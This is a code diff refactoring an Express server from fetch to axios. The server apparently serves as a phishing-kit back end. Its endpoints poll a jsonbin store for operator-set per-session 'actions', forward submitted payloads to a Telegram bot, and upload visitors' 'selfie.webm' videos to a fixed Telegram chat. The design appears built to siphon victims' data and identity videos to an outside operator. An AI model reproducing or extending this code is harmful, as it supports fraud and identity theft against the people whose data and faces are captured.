@@ -1,5 +1,7 @@
-﻿const express = require('express');
+const express = require('express');
 const path = require('path');
+const axios = require('axios');
+const FormData = require('form-data');
 
 const app = express();
 const port = process.env.PORT || 8080;
@@ -17,8 +19,8 @@ app.get('/api/check-action', async (req, res) => {
   if (!BIN_ID || !API_KEY) return res.status(200).json({ action: 'pending' });
 
   try {
-    const resp = await fetch('https://api.jsonbin.io/v3/b/' + BIN_ID + '/latest', { headers: { 'X-Master-Key': API_KEY } });
-    const jsonResp = await resp.json();
+    const resp = await axios.get('https://api.jsonbin.io/v3/b/' + BIN_ID + '/latest', { headers: { 'X-Master-Key': API_KEY } });
+    const jsonResp = resp.data;
     const data = jsonResp.record || {};
     const action = data[sessionId];
     
@@ -56,15 +58,10 @@ app.post('/api/send-telegram', async (req, res) => {
   }
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-    const data = await response.json();
-    res.status(200).json(data);
+    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, payload);
+    res.status(200).json(response.data);
   } catch (error) {
-    res.status(500).json({ error: error.toString() });
+    res.status(500).json({ error: error.response ? error.response.data : error.toString() });
   }
 });
 
@@ -79,17 +76,17 @@ app.post('/api/send-video', async (req, res) => {
 
   try {
     const buffer = Buffer.from(videoBase64, 'base64');
-    const blob = new Blob([buffer], { type: 'video/webm' });
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-    formData.append('caption', caption);
-    formData.append('video', blob, 'selfie.webm');
+    if (caption) formData.append('caption', caption);
+    formData.append('video', buffer, { filename: 'selfie.webm', contentType: 'video/webm' });
 
-    const resp = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', { method: 'POST', body: formData });
-    const data = await resp.json();
-    return res.status(200).json({ ok: data.ok, data: data });
+    const resp = await axios.post('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', formData, {
+      headers: formData.getHeaders()
+    });
+    return res.status(200).json({ ok: resp.data.ok, data: resp.data });
   } catch (err) {
-    return res.status(500).json({ ok: false, error: err.message });
+    return res.status(500).json({ ok: false, error: err.response ? err.response.data : err.message });
   }
 });
 
